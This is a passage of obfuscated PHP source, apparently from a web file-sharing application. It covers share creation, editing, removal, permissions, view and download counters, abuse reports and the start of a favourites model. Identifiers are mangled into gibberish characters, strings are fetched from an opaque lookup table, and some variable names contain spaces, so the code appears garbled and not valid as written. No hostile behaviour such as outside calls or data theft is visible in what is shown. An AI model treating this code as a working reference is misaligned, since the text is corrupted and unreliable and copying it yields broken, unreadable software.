$©šÔ÷ÈÔ; } $É×öò Š = $¡¯ øÊ[2036]; $ÑèŒÛï = array($¡¯ øÊ[634] => array($¡¯ øÊ[460], array_keys($üÑª€Ò³)), $¡¯ øÊ[1690] => array($¡¯ øÊ[1057], $¡¯ øÊ[212])); $Û«ƒÊºâ = $this->field($É×öò Š)->where($ÑèŒÛï)->select(); foreach ($Û«ƒÊºâ as $ˆªí‹‰Ü => &$ØˆÄ¢¶) { $ØˆÄ¢¶[$¡¯ øÊ[2032]] = $üÑª€Ò³[$ØˆÄ¢¶[$¡¯ øÊ[634]]]; } unset($ØˆÄ¢¶); $¾À½¯’ = array($¡¯ øÊ[2037] => $Û«ƒÊºâ, $¡¯ øÊ[2038] => $©šÔ÷ÈÔ[$¡¯ øÊ[410]]); return $¾À½¯’; } protected function shareAdd($ĞôÙ·à, $Â£‘¡Ó) { $ôû»íœØ =& $_SERVER[³½¬ÚË¯]; $Ñ¼àµ¤Ù = $this->_addShareData($ĞôÙ·à, $Â£‘¡Ó); if (!empty($Â£‘¡Ó[$ôû»íœØ[2039]])) { $this->_shareAuthSet($Ñ¼àµ¤Ù, $Â£‘¡Ó[$ôû»íœØ[2039]]); } $this->shareEventAdd($ĞôÙ·à, $Â£‘¡Ó, $ôû»íœØ[2040]); return $Ñ¼àµ¤Ù; } protected function shareAddSystem($ÂÑÏí‡, $¢ÆÖª½”) { $¸©¨ÆÂĞ =& $_SERVER[³½¬ÚË¯]; $Ó†±ÌĞÀ = $this->_addShareData($ÂÑÏí‡, $¢ÆÖª½”, $¸©¨ÆÂĞ[179]); $this->_shareAuthSet($Ó†±ÌĞÀ, $¢ÆÖª½”[$¸©¨ÆÂĞ[2039]]); return $Ó†±ÌĞÀ; } private function shareEventAdd($ÕËô÷Ë, $¯€‡ÕÙƒ, $ïÆ—ª£† = "\141\144\144") { $òé “ªë =& $_SERVER[³½¬ÚË¯]; if (!$ÕËô÷Ë || $ÕËô÷Ë == $òé “ªë[212]) { return; } if ($ïÆ—ª£† == $òé “ªë[2040]) { if ($¯€‡ÕÙƒ[$òé “ªë[531]] == $òé “ªë[88]) { Model($òé “ªë[602])->eventShare($ÕËô÷Ë, $òé “ªë[2041]); } if ($¯€‡ÕÙƒ[$òé “ªë[632]] == $òé “ªë[88]) { Model($òé “ªë[602])->eventShare($ÕËô÷Ë, $òé “ªë[2042]); } return; } $ê†€†Ğ = $this->getInfoByPath($ÕËô÷Ë); $¾Éˆ›åß = $òé “ªë[2043]; if ($ê†€†Ğ[$òé “ªë[531]] == $òé “ªë[212] && $¯€‡ÕÙƒ[$òé “ªë[531]] == $òé “ªë[88]) { $¾Éˆ›åß = $òé “ªë[2041]; } if ($ê†€†Ğ[$òé “ªë[531]] == $òé “ªë[88] && $¯€‡ÕÙƒ[$òé “ªë[531]] == $òé “ªë[212]) { $¾Éˆ›åß = $òé “ªë[2044]; } if ($ê†€†Ğ[$òé “ªë[632]] == $òé “ªë[212] && $¯€‡ÕÙƒ[$òé “ªë[632]] == $òé “ªë[88]) { $¾Éˆ›åß = $òé “ªë[2042]; } if ($ê†€†Ğ[$òé “ªë[632]] == $òé “ªë[88] && $¯€‡ÕÙƒ[$òé “ªë[632]] == $òé “ªë[212]) { $¾Éˆ›åß = $òé “ªë[2045]; } Model($òé “ªë[602])->eventShare($ÕËô÷Ë, $¾Éˆ›åß); return; } private function _addShareData($…äÌË¹Œ, $Íï­—úä = array(), $©ÆÇÁï· = false) { $¼ÈĞ”Â¢ =& $_SERVER[³½¬ÚË¯]; $Êƒ»¤æ¸ = $©ÆÇÁï· == $¼ÈĞ”Â¢[179] ? 0 : USER_ID; $÷›¾¡­ó = array($¼ÈĞ”Â¢[459] => $…äÌË¹Œ, $¼ÈĞ”Â¢[1681] => $Êƒ»¤æ¸); if ($…äÌË¹Œ == 0) { $÷›¾¡­ó = array($¼ÈĞ”Â¢[2046] => $Íï­—úä[$¼ÈĞ”Â¢[1218]], $¼ÈĞ”Â¢[1681] => $Êƒ»¤æ¸); } if ($”³èæ¡æ = $this->where($÷›¾¡­ó)->find()) { return $”³èæ¡æ[$¼ÈĞ”Â¢[634]]; } if ($…äÌË¹Œ == 0) { $¸º„Ùî = array($¼ÈĞ”Â¢[32] => get_path_this($Íï­—úä[$¼ÈĞ”Â¢[84]])); } else { $¸º„Ùî = Model($¼ÈĞ”Â¢[861])->sourceInfo($…äÌË¹Œ); if (!$¸º„Ùî) { return !1; } } if (!$Íï­—úä[$¼ÈĞ”Â¢[1587]]) { $Íï­—úä[$¼ÈĞ”Â¢[1587]] = $¸º„Ùî[$¼ÈĞ”Â¢[32]]; } $«õĞŸçÒ = array($¼ÈĞ”Â¢[1681] => $Êƒ»¤æ¸, $¼ÈĞ”Â¢[459] => $…äÌË¹Œ, $¼ÈĞ”Â¢[1587] => $¼ÈĞ”Â¢[12], $¼ÈĞ”Â¢[531] => 0, $¼ÈĞ”Â¢[632] => 0, $¼ÈĞ”Â¢[1218] => $¼ÈĞ”Â¢[12], $¼ÈĞ”Â¢[351] => $¼ÈĞ”Â¢[12], $¼ÈĞ”Â¢[932] => $¼ÈĞ”Â¢[12], $¼ÈĞ”Â¢[2047] => 0, $¼ÈĞ”Â¢[2048] => 0, $¼ÈĞ”Â¢[797] => 0, $¼ÈĞ”Â¢[2049] => $¼ÈĞ”Â¢[12], $¼ÈĞ”Â¢[2030] => $¼ÈĞ”Â¢[12]); $Ã¼êÔ÷Ä = explode($¼ÈĞ”Â¢[50], $¼ÈĞ”Â¢[2050]); foreach ($Ã¼êÔ÷Ä as $°šóó¾) { if (!isset($Íï­—úä[$°šóó¾])) { continue; } $«õĞŸçÒ[$°šóó¾] = $Íï­—úä[$°šóó¾]; } $ÜİÀí¦ = $this->add($«õĞŸçÒ); $È¹ÅÍö‹ = array($¼ÈĞ”Â¢[2030] => short_id($ÜİÀí¦)); $this->where(array($¼ÈĞ”Â¢[2051] => $ÜİÀí¦))->save($È¹ÅÍö‹); return $ÜİÀí¦; } private function _shareAuthSet($öë•Íä, $ˆÛµîª‡) { $˜ßÜª¸« =& $_SERVER[³½¬ÚË¯]; if (!is_array($ˆÛµîª‡)) { return !1; } $Õ‹»í†¼ = Model($˜ßÜª¸«[1996]); $Õ‹»í†¼->where(array($˜ßÜª¸«[634] => $öë•Íä))->delete(); $öÃ¢¯ÃË = array(); foreach ($ˆÛµîª‡ as $‰ï¹’±à) { $ÖÃ¾çà = SourceModel::TYPE_USER; if ($‰ï¹’±à[$˜ßÜª¸«[178]] == SourceModel::TYPE_GROUP) { $ÖÃ¾çà = SourceModel::TYPE_GROUP; } $¤´Íèå¢ = array($˜ßÜª¸«[634] => $öë•Íä, $˜ßÜª¸«[178] => $ÖÃ¾çà, $˜ßÜª¸«[539] => intval($‰ï¹’±à[$˜ßÜª¸«[539]]), $˜ßÜª¸«[1992] => 0, $˜ßÜª¸«[2052] => -1); if ($‰ï¹’±à[$˜ßÜª¸«[1992]]) { $¤´Íèå¢[$˜ßÜª¸«[1992]] = $‰ï¹’±à[$˜ßÜª¸«[1992]]; } else { if ($‰ï¹’±à[$˜ßÜª¸«[2052]]) { $¤´Íèå¢[$˜ßÜª¸«[2052]] = $‰ï¹’±à[$˜ßÜª¸«[2052]]; } } $öÃ¢¯ÃË[] = $¤´Íèå¢; } return $Õ‹»í†¼->addAll($öÃ¢¯ÃË, array(), !0); } public function numViewAdd($°šŞâß) { $Ñü÷Ä¿í =& $_SERVER[³½¬ÚË¯]; $°¯¦Û“è = array($Ñü÷Ä¿í[2051] => $°šŞâß); $this->where($°¯¦Û“è)->setAdd($Ñü÷Ä¿í[2047]); } public function numDownloadAdd($Êü†¶æ¤) { $ºæÅÛİˆ =& $_SERVER[³½¬ÚË¯]; $óò»Ù£ = array($ºæÅÛİˆ[2051] => $Êü†¶æ¤); $this->where($óò»Ù£)->setAdd($ºæÅÛİˆ[2048]); } protected function shareEdit($û¶‘ûšƒ, $ŸåöŒİú) { $ãÔßâ =& $_SERVER[³½¬ÚË¯]; $ÑıÎŞ = $this->getInfo($û¶‘ûšƒ); if (!$ÑıÎŞ) { return !1; } $this->_checkLinkShare($ŸåöŒİú, $ÑıÎŞ); $Îú‘Ëß = array(); $²öóüç = explode($ãÔßâ[50], $ãÔßâ[2053]); foreach ($²öóüç as $™ğ‘ÅŞ) { if (!array_key_exists($™ğ‘ÅŞ, $ŸåöŒİú)) { continue; } $Îú‘Ëß[$™ğ‘ÅŞ] = $ŸåöŒİú[$™ğ‘ÅŞ]; } $this->shareEventAdd($ÑıÎŞ[$ãÔßâ[181]], $ŸåöŒİú, $ãÔßâ[1858]); $this->where(array($ãÔßâ[2051] => $û¶‘ûšƒ))->save($Îú‘Ëß); if (isset($ŸåöŒİú[$ãÔßâ[2039]])) { $this->_shareAuthSet($û¶‘ûšƒ, $ŸåöŒİú[$ãÔßâ[2039]]); } return !0; } private function _checkLinkShare($½è†ìÍª, $à÷ŒÄçñ) { $óæ™õÆ =& $_SERVER[³½¬ÚË¯]; if ($½è†ìÍª[$óæ™õÆ[531]] != $óæ™õÆ[88]) { return; } $¤’®×Ò = $à÷ŒÄçñ[$óæ™õÆ[87]][$óæ™õÆ[181]]; if ($à÷ŒÄçñ[$óæ™õÆ[87]][$óæ™õÆ[33]] != $óæ™õÆ[214]) { $Ô–¯“ª = $this->_folderReport($¤’®×Ò); if (!$Ô–¯“ª) { return; } show_json(LNG($óæ™õÆ[2054]) . $óæ™õÆ[2055] . $Ô–¯“ª, !1); } $»âƒè”è = Model($óæ™õÆ[861])->fileInfoGet($à÷ŒÄçñ[$óæ™õÆ[87]][$óæ™õÆ[181]]); if (!$»âƒè”è) { return; } $§ÙÇÉû = $this->shareFileMeta($»âƒè”è[$óæ™õÆ[509]]); if (isset($§ÙÇÉû[$óæ™õÆ[418]]) && $§ÙÇÉû[$óæ™õÆ[418]] == $óæ™õÆ[88]) { show_json(LNG($óæ™õÆ[2056]), !1); } } private function _folderReport($’ÔÁÀ÷ ) { $ãş—Ñ¥Ù =& $_SERVER[³½¬ÚË¯]; $ßûœú¢Î = array($ãş—Ñ¥Ù[509] => array($ãş—Ñ¥Ù[1055], 0), $ãş—Ñ¥Ù[786] => 3); $Ôâ€²¹Ú = Model($ãş—Ñ¥Ù[2057])->where($ßûœú¢Î)->field($ãş—Ñ¥Ù[509])->select(); if (!$Ôâ€²¹Ú) { return !1; } $Ôâ€²¹Ú = array_to_keyvalue($Ôâ€²¹Ú, $ãş—Ñ¥Ù[12], $ãş—Ñ¥Ù[509]); $âõÍ÷ä— = $ãş—Ñ¥Ù[50] . $’ÔÁÀ÷  . $ãş—Ñ¥Ù[50]; $ßûœú¢Î = array($ãş—Ñ¥Ù[509] => array($ãş—Ñ¥Ù[7], $Ôâ€²¹Ú), $ãş—Ñ¥Ù[554] => array($ãş—Ñ¥Ù[427], "\x25{$âõÍ÷ä—}\45"), $ãş—Ñ¥Ù[473] => 0); $‚ğÈ¹ÔË = Model($ãş—Ñ¥Ù[861])->where($ßûœú¢Î)->field($ãş—Ñ¥Ù[2058])->find(); if (!$‚ğÈ¹ÔË) { return !1; } $÷Ã¼÷³” = substr($‚ğÈ¹ÔË[$ãş—Ñ¥Ù[554]], strpos($‚ğÈ¹ÔË[$ãş—Ñ¥Ù[554]], $âõÍ÷ä—)); $ßûœú¢Î = array($ãş—Ñ¥Ù[181] => array($ãş—Ñ¥Ù[7], trim($÷Ã¼÷³”, $ãş—Ñ¥Ù[50]))); $‚ÚÏÚÙ· = Model($ãş—Ñ¥Ù[861])->where($ßûœú¢Î)->field($ãş—Ñ¥Ù[32])->select(); $Ñ¼±àè = array_to_keyvalue($‚ÚÏÚÙ·, $ãş—Ñ¥Ù[12], $ãş—Ñ¥Ù[32]); $Ñ¼±àè[] = $‚ğÈ¹ÔË[$ãş—Ñ¥Ù[32]]; return implode($ãş—Ñ¥Ù[8], $Ñ¼±àè); } protected function remove($¹´Š±‡) { $Èé™»Ÿı =& $_SERVER[³½¬ÚË¯]; if (is_array($¹´Š±‡)) { $¹´Š±‡ = array($Èé™»Ÿı[7], $¹´Š±‡); } $éñù“ğ¢ = array($Èé™»Ÿı[634] => $¹´Š±‡); $…¹ï³Š = $this->where($éñù“ğ¢)->delete(); if ($…¹ï³Š) { Model($Èé™»Ÿı[635])->where(array($Èé™»Ÿı[634] => $¹´Š±‡))->delete(); } $ô”ùæÍ = is_array($¹´Š±‡) ? $¹´Š±‡[1] : array($¹´Š±‡); for ($¢ÜûÜçá = 0; $¢ÜûÜçá < count($ô”ùæÍ); $¢ÜûÜçá++) { $–áû×Á = $this->getInfo($ô”ùæÍ[$¢ÜûÜçá]); if ($–áû×Á[$Èé™»Ÿı[632]] == $Èé™»Ÿı[88]) { Model($Èé™»Ÿı[602])->eventShare($–áû×Á[$Èé™»Ÿı[181]], $Èé™»Ÿı[2045]); } if ($–áû×Á[$Èé™»Ÿı[531]] == $Èé™»Ÿı[88]) { Model($Èé™»Ÿı[602])->eventShare($–áû×Á[$Èé™»Ÿı[181]], $Èé™»Ÿı[2044]); } } return $…¹ï³Š; } protected function removeBySource($úÑ—„äÃ) { $¥Å»… =& $_SERVER[³½¬ÚË¯]; $ò¥£Ÿ†â = array($¥Å»…[459] => array($¥Å»…[460], $úÑ—„äÃ)); $°ŸÙøÉÅ = $this->field($¥Å»…[634])->where($ò¥£Ÿ†â)->select(); $°ŸÙøÉÅ = array_to_keyvalue($°ŸÙøÉÅ, $¥Å»…[12], $¥Å»…[634]); if (!$°ŸÙøÉÅ) { return; } $ò¥£Ÿ†â = array($¥Å»…[2051] => array($¥Å»…[460], $°ŸÙøÉÅ)); $this->where($ò¥£Ÿ†â)->delete(); Model($¥Å»…[635])->where($ò¥£Ÿ†â)->delete(); } public function listAll($À°Óáß±) { $ÍïÖ‚‘Ş =& $_SERVER[³½¬ÚË¯]; $ÜÄ…š¯˜ = array(); if ($À°Óáß±[$ÍïÖ‚‘Ş[1690]]) { $ÜÄ…š¯˜[$ÍïÖ‚‘Ş[1690]] = $À°Óáß±[$ÍïÖ‚‘Ş[1690]]; } if ($À°Óáß±[$ÍïÖ‚‘Ş[796]]) { $©øëÂ§ = $À°Óáß±[$ÍïÖ‚‘Ş[797]] ? $À°Óáß±[$ÍïÖ‚‘Ş[797]] : strtotime(date($ÍïÖ‚‘Ş[2059])); $ÜÄ…š¯˜[$ÍïÖ‚‘Ş[215]] = array($ÍïÖ‚‘Ş[377], array($À°Óáß±[$ÍïÖ‚‘Ş[796]], $©øëÂ§)); } if ($À°Óáß±[$ÍïÖ‚‘Ş[33]]) { $ÜÄ…š¯˜[$À°Óáß±[$ÍïÖ‚‘Ş[33]]] = 1; } else { $ÜÄ…š¯˜[] = array($ÍïÖ‚‘Ş[531] => array($ÍïÖ‚‘Ş[1055], 0), $ÍïÖ‚‘Ş[632] => array($ÍïÖ‚‘Ş[1055], 0), $ÍïÖ‚‘Ş[2033] => $ÍïÖ‚‘Ş[1986]); } if ($À°Óáß±[$ÍïÖ‚‘Ş[1982]]) { $ÜÄ…š¯˜[] = array($ÍïÖ‚‘Ş[2030] => $À°Óáß±[$ÍïÖ‚‘Ş[1982]], $ÍïÖ‚‘Ş[1587] => array($ÍïÖ‚‘Ş[427], "\45{$À°Óáß±[$ÍïÖ‚‘Ş[1982]]}\x25"), $ÍïÖ‚‘Ş[2033] => $ÍïÖ‚‘Ş[1986]); } $÷ã‡„Ü¬ = $this->_makeOrder()->where($ÜÄ…š¯˜)->selectPage(20); if (empty($÷ã‡„Ü¬[$ÍïÖ‚‘Ş[413]])) { return array(); } $this->_listDataApply($÷ã‡„Ü¬[$ÍïÖ‚‘Ş[413]]); return $÷ã‡„Ü¬; } public function listDataApply($àˆ¢¼“) { $this->_listDataApply($àˆ¢¼“); return $àˆ¢¼“; } private function _listDataApply(&$Ş»Áƒœ¹) { $ÕØ­ò¯µ =& $_SERVER[³½¬ÚË¯]; $À½ñ£ü = array_to_keyvalue($Ş»Áƒœ¹, $ÕØ­ò¯µ[12], $ÕØ­ò¯µ[1690]); $í©¼‹Å = Model($ÕØ­ò¯µ[568])->userListInfo(array_unique($À½ñ£ü)); $­´òà = array_to_keyvalue($Ş»Áƒœ¹, $ÕØ­ò¯µ[12], $ÕØ­ò¯µ[181]); $“§è‘î = Model($ÕØ­ò¯µ[861])->sourceListInfo($­´òà, !0); foreach ($Ş»Áƒœ¹ as $›ƒ²‡¥Ç => &$ÃÛÜú£’) { $¢Ñ•§© = $ÃÛÜú£’[$ÕØ­ò¯µ[1690]]; $ÃÛÜú£’[$ÕØ­ò¯µ[2060]] = $í©¼‹Å[$¢Ñ•§©] ? $í©¼‹Å[$¢Ñ•§©] : !1; $‚©ŸÃ¸ß = $ÃÛÜú£’[$ÕØ­ò¯µ[181]]; $ÃÛÜú£’[$ÕØ­ò¯µ[87]] = $“§è‘î[$‚©ŸÃ¸ß] ? $“§è‘î[$‚©ŸÃ¸ß] : !1; if ($ÃÛÜú£’[$ÕØ­ò¯µ[87]][$ÕØ­ò¯µ[473]] == $ÕØ­ò¯µ[88]) { unset($Ş»Áƒœ¹[$›ƒ²‡¥Ç]); } if ($ÃÛÜú£’[$ÕØ­ò¯µ[87]] != $ÕØ­ò¯µ[212] && !$ÃÛÜú£’[$ÕØ­ò¯µ[87]]) { unset($Ş»Áƒœ¹[$›ƒ²‡¥Ç]); } } unset($ÃÛÜú£’); $Ş»Áƒœ¹ = array_values($Ş»Áƒœ¹); } private function _makeOrder($×©¢Øç¶ = '') { $‰Ãíòƒ¡ =& $_SERVER[³½¬ÚË¯]; $¨ø’”ßı = array($‰Ãíòƒ¡[215], $‰Ãíòƒ¡[797], $‰Ãíòƒ¡[2047], $‰Ãíòƒ¡[2048]); $Ñ›·ŒİÊ = array($‰Ãíòƒ¡[491] => $‰Ãíòƒ¡[492], $‰Ãíòƒ¡[493] => $‰Ãíòƒ¡[494]); $ŞÉÄŒ = Input::get($‰Ãíòƒ¡[498], $‰Ãíòƒ¡[7], $‰Ãíòƒ¡[465], $¨ø’”ßı); $óÊõŠª = Input::get($‰Ãíòƒ¡[499], $‰Ãíòƒ¡[7], $‰Ãíòƒ¡[2061], array($‰Ãíòƒ¡[1979], $‰Ãíòƒ¡[493])); $óÊõŠª = $Ñ›·ŒİÊ[$óÊõŠª]; $×©¢Øç¶ = $×©¢Øç¶ . "{$ŞÉÄŒ}\x20{$óÊõŠª}"; return $this->order($×©¢Øç¶); } public function reportAdd($§‘†ĞƒĞ) { $ÍËğğ¹† =& $_SERVER[³½¬ÚË¯]; $¯¨»£ = array($ÍËğğ¹†[634] => $§‘†ĞƒĞ[$ÍËğğ¹†[634]], $ÍËğğ¹†[1690] => USER_ID); if (Model($ÍËğğ¹†[2057])->where($¯¨»£)->find()) { return !1; } $…ÀÆÀ° = array($ÍËğğ¹†[634] => $§‘†ĞƒĞ[$ÍËğğ¹†[634]], $ÍËğğ¹†[1587] => $§‘†ĞƒĞ[$ÍËğğ¹†[1587]], $ÍËğğ¹†[181] => $§‘†ĞƒĞ[$ÍËğğ¹†[181]], $ÍËğğ¹†[509] => $§‘†ĞƒĞ[$ÍËğğ¹†[509]], $ÍËğğ¹†[1690] => USER_ID, $ÍËğğ¹†[33] => $§‘†ĞƒĞ[$ÍËğğ¹†[33]], $ÍËğğ¹†[494] => $§‘†ĞƒĞ[$ÍËğğ¹†[494]]); return Model($ÍËğğ¹†[2057])->add($…ÀÆÀ°); } public function reportList($æ²‰Ğ¼´) { $å½Óçªé =& $_SERVER[³½¬ÚË¯]; $úÁ¶ÑÎğ = array(); if ($æ²‰Ğ¼´[$å½Óçªé[796]]) { $›¯áƒÃ = $æ²‰Ğ¼´[$å½Óçªé[797]] ? $æ²‰Ğ¼´[$å½Óçªé[797]] : strtotime(date($å½Óçªé[2059])); $úÁ¶ÑÎğ[$å½Óçªé[215]] = array($å½Óçªé[377], array($æ²‰Ğ¼´[$å½Óçªé[796]], $›¯áƒÃ)); } if (isset($æ²‰Ğ¼´[$å½Óçªé[33]]) && in_array($æ²‰Ğ¼´[$å½Óçªé[33]], array($å½Óçªé[88], $å½Óçªé[478], $å½Óçªé[2062], $å½Óçªé[2063], $å½Óçªé[2064]))) { $úÁ¶ÑÎğ[$å½Óçªé[33]] = $æ²‰Ğ¼´[$å½Óçªé[33]]; } if (isset($æ²‰Ğ¼´[$å½Óçªé[786]]) && in_array($æ²‰Ğ¼´[$å½Óçªé[786]], array($å½Óçªé[212], $å½Óçªé[88], $å½Óçªé[478], $å½Óçªé[2062]))) { $úÁ¶ÑÎğ[$å½Óçªé[786]] = $æ²‰Ğ¼´[$å½Óçªé[786]]; } $¤ÀåÓ  = Input::get($å½Óçªé[499], $å½Óçªé[7], $å½Óçªé[2061], array($å½Óçªé[1979], $å½Óçªé[493])); $­€ïâùı = array($å½Óçªé[491] => $å½Óçªé[492], $å½Óçªé[493] => $å½Óçªé[494]); $×šÈ£µº = $å½Óçªé[2065] . $­€ïâùı[$¤ÀåÓ ]; $æ€áÉÎœ = Model($å½Óçªé[2057])->where($úÁ¶ÑÎğ)->order($×šÈ£µº)->selectPage(20); if (empty($æ€áÉÎœ[$å½Óçªé[413]])) { return array(); } $î˜Ÿçø = array_to_keyvalue_group($æ€áÉÎœ[$å½Óçªé[413]], $å½Óçªé[786], $å½Óçªé[634]); if (!empty($î˜Ÿçø[0])) { $æ²‰Ğ¼´ = $î˜Ÿçø[0]; $úÁ¶ÑÎğ = array($å½Óçªé[634] => array($å½Óçªé[7], $æ²‰Ğ¼´)); $Æ¦ğ»¡¨ = $this->where($úÁ¶ÑÎğ)->field($å½Óçªé[634])->select(); $Æ¦ğ»¡¨ = array_to_keyvalue($Æ¦ğ»¡¨, $å½Óçªé[12], $å½Óçªé[634]); $©šÌë×ƒ = array_diff($æ²‰Ğ¼´, $Æ¦ğ»¡¨); if (!empty($©šÌë×ƒ)) { foreach ($æ€áÉÎœ[$å½Óçªé[413]] as $ß¦­ú˜½ => $¸½›Îèş) { if (in_array($¸½›Îèş[$å½Óçªé[634]], $©šÌë×ƒ)) { unset($æ€áÉÎœ[$å½Óçªé[413]][$ß¦­ú˜½]); } } } } $this->_listDataApply($æ€áÉÎœ[$å½Óçªé[413]]); return $æ€áÉÎœ; } public function reportStatus($’ÚŞšé) { $¸Œñùß =& $_SERVER[³½¬ÚË¯]; $ôı˜¾ñ = array($¸Œñùß[443] => $’ÚŞšé[$¸Œñùß[443]]); $³˜ì´áğ = Model($¸Œñùß[2057])->where($ôı˜¾ñ)->field($¸Œñùß[2066])->find(); if (!$³˜ì´áğ) { return !1; } $ÕóŠÍ‚è = array($¸Œñùß[786] => $’ÚŞšé[$¸Œñùß[786]]); if ($’ÚŞšé[$¸Œñùß[786]] == $¸Œñùß[2062] && $³˜ì´áğ[$¸Œñùß[786]] == $¸Œñùß[2062]) { $ÕóŠÍ‚è[$¸Œñùß[786]] = 0; } $…™¿í…ë = Model($¸Œñùß[2057])->where($ôı˜¾ñ)->save($ÕóŠÍ‚è); if ($’ÚŞšé[$¸Œñùß[786]] == $¸Œñùß[478]) { if ($³˜ì´áğ[$¸Œñùß[509]] != $¸Œñùß[212] && $this->shareFileMeta($³˜ì´áğ[$¸Œñùß[509]])) { $this->shareFileMeta($³˜ì´áğ[$¸Œñùß[509]], 0); } $this->remove($³˜ì´áğ[$¸Œñùß[634]]); return !0; } if ($…™¿í…ë && $’ÚŞšé[$¸Œñùß[786]] == $¸Œñùß[2062]) { $Ê¨¯öó‚ = $ÕóŠÍ‚è[$¸Œñùß[786]] == $¸Œñùß[2062] ? 1 : 0; $this->shareFileMeta($³˜ì´áğ[$¸Œñùß[509]], $Ê¨¯öó‚); $this->removeByFile($³˜ì´áğ[$¸Œñùß[509]]); } return $…™¿í…ë; } private function removeByFile($¯ş¶Àğà) { $”Ö¼³Ê =& $_SERVER[³½¬ÚË¯]; $Ø”¨ˆ– = Model($”Ö¼³Ê[861])->where(array($”Ö¼³Ê[509] => $¯ş¶Àğà))->field($”Ö¼³Ê[181])->select(); $ë¶áïÒÜ = array_to_keyvalue($Ø”¨ˆ–, $”Ö¼³Ê[12], $”Ö¼³Ê[181]); $–àŠ»ªÑ = array($”Ö¼³Ê[181] => array($”Ö¼³Ê[7], $ë¶áïÒÜ), $”Ö¼³Ê[531] => 1); $Ø”¨ˆ– = $this->where($–àŠ»ªÑ)->field($”Ö¼³Ê[634])->select(); if (empty($Ø”¨ˆ–)) { return; } $±©–¥ï = array_to_keyvalue($Ø”¨ˆ–, $”Ö¼³Ê[12], $”Ö¼³Ê[634]); $this->remove($±©–¥ï); } private function shareFileMeta($ï†Š¾›¾, $û¹Ç°â = null) { $«ş²‚Ê˜ =& $_SERVER[³½¬ÚË¯]; $©ÔŞ’ÜÊ = array($«ş²‚Ê˜[509] => $ï†Š¾›¾, $«ş²‚Ê˜[94] => $«ş²‚Ê˜[2067]); if (is_null($û¹Ç°â)) { return Model($«ş²‚Ê˜[2068])->where($©ÔŞ’ÜÊ)->find(); } $©ÔŞ’ÜÊ[$«ş²‚Ê˜[418]] = $û¹Ç°â; Model($«ş²‚Ê˜[2068])->add($©ÔŞ’ÜÊ, array(), !0); } } goto aòğØ‹¥Õ˜; C•ê‘áÚŞ®: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($  øÜâ‡) { $¹· çÑ =& $_SERVER[³½¬ÚË¯]; return array($¹· çÑ[1999] => array(USER_ID, $¹· çÑ[2337])); } protected function listData() { $ˆÕ¤ä²÷ =& $_SERVER[³½¬ÚË¯]; $„˜Ğç›Ô = array($ˆÕ¤ä²÷[1681] => USER_ID, $ˆÕ¤ä²÷[526] => 0); $©§é°ß¶ = $ˆÕ¤ä²÷[2338]; $åÊÜŞ† = $this->field($©§é°ß¶)->where($„˜Ğç›Ô)->order($ˆÕ¤ä²÷[2339])->select(); return $åÊÜŞ† ? $åÊÜŞ† : array(); } protected function resetCache() { } protected function listView() { $ÜÍÉ†¦å =& $_SERVER[³½¬ÚË¯]; $£Ñş–±Ş = $this->listData(); $¥¥öÈ”ı = array_filter_by_field($£Ñş–±Ş, $ÜÍÉ†¦å[33], $ÜÍÉ†¦å[458]); $íèçæÊï = array_to_keyvalue($¥¥öÈ”ı, $ÜÍÉ†¦å[12], $ÜÍÉ†¦å[84]); if (!$íèçæÊï) { return $£Ñş–±Ş; } $«Èó¥‰ = 2000; $ŒÏ±Şıí = array($ÜÍÉ†¦å[459] => array($ÜÍÉ†¦å[460], $íèçæÊï)); $×®ıî¢Í = Model($ÜÍÉ†¦å[861])->listSource($ŒÏ±Şıí, $«Èó¥‰); $×®ıî¢Í = array_merge($×®ıî¢Í[$ÜÍÉ†¦å[83]], $×®ıî¢Í[$ÜÍÉ†¦å[82]]); $×®ıî¢Í = array_to_keyvalue($×®ıî¢Í, $ÜÍÉ†¦å[181]); foreach ($£Ñş–±Ş as $íàüÚé => $ò±ÃĞ€–) { $®Áƒ‘¶­ = $×®ıî¢Í[$ò±ÃĞ€–[$ÜÍÉ†¦å[84]]]; $®Áƒ‘¶­ = $®Áƒ‘¶­ ? $®Áƒ‘¶­ : array(); $£Ñş–±Ş[$íàüÚé] = array_merge($®Áƒ‘¶­, $ò±ÃĞ€–); } return $£Ñş–±Ş; } protected function addFav($¶ß€ö«Ì, $Ëê­ç¢Æ = '', $’— †ãé = "\x73\157\165\x72\x63\145") { $»´—ŸÅÊ =& $_SERVER[³½¬ÚË¯]; $”í«Á¶ = array($»´—ŸÅÊ[1681] => USER_ID, $»´—ŸÅÊ[526] => 0, $»´—ŸÅÊ[464] => $’— †ãé, $»´—ŸÅÊ[463] => $¶ß€ö«Ì); if ($this->where($”í«Á¶)->find()) { return !1; } $”í«Á¶ = array($»´—ŸÅÊ[1681] => USER_ID, $»´—ŸÅÊ[526] => 0); $–ŸĞŞñ‰ = $this->where($”í«Á¶)->max($»´—ŸÅÊ[1912]); if (!$–ŸĞŞñ‰) { $–ŸĞŞñ‰ = 0; } if (!$Ëê­ç¢Æ && $’— †ãé == $»´—ŸÅÊ[458]) { $íŠæëğÙ = Model($»´—ŸÅÊ[1375])->where(array($»´—ŸÅÊ[459] => $¶ß€ö«Ì))->find(); if (!$íŠæëğÙ) { return !1; } $Ëê­ç¢Æ = $íŠæëğÙ[$»´—ŸÅÊ[32]]; } $Ëê­ç¢Æ = $this->getAutoName($Ëê­ç¢Æ); $ÒÓ›Æœ¯ = array($»´—ŸÅÊ[1681] => USER_ID, $»´—ŸÅÊ[526] => 0, $»´—ŸÅÊ[462] => $Ëê­ç¢Æ, $»´—ŸÅÊ[463] => $¶ß€ö«Ì, $»´—ŸÅÊ[464] => $’— †ãé, $»´—ŸÅÊ[1892] => $–ŸĞŞñ‰ + 1); return $this->add($ÒÓ›Æœ¯); } protected function remove($‡ã¿®çÁ) { $§ø›İ©ë =& $_SERVER[³½¬ÚË¯]; $™à’çôû = array($§ø›İ©ë[1681] => USER_ID, $§ø›İ©ë[461] => $‡ã¿®çÁ); return $this->where($™à’çôû)->delete(); } protected function removeByName($Ê²Ñ¤µ) { $”çí€Ä =& $_SERVER[³½¬ÚË¯]; $™éË´¢½ = array($”çí€Ä[1681] => USER_ID, $”çí€Ä[462] => $Ê²Ñ¤µ, $”çí€Ä[526] => 0); return $this->where($™éË´¢½)->delete(); } protected function rename($œõ±ÚÔÉ, $€ÒÆ•¢Ã) { $äö«Ã“¤ =& $_SERVER[³½¬ÚË¯]; if ($œõ±ÚÔÉ == $€ÒÆ•¢Ã) { return !1; } $¨Îˆé¤ò = $this->getAutoName($€ÒÆ•¢Ã); if ($€ÒÆ•¢Ã != $¨Îˆé¤ò) { return 